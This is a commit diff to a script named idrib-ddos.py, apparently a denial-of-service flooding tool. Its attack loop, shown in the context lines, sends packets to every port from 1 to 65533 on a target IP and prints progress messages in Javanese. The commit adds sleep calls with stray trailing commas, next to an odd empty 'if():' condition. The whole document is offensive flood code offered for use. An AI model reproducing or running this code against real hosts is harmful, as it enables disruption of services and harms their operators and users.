0c6854ea23078c6378b2195bea97236a54494d60
Kodekeras24 <zhanahmad57@gmail.com>
2024-12-06 02:30:22 +0700

    Update idrib-ddos.py

--- idrib-ddos.py
+++ idrib-ddos.py
@@ -70,7 +70,9 @@ while True:
     for port in range(1, 65534):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
+        time.sleep(2),
         print("\033[94m[IDRIB] \033[97m%s  \033[31m[Ngirim ke]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
     if():
+        time.sleep(2),
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
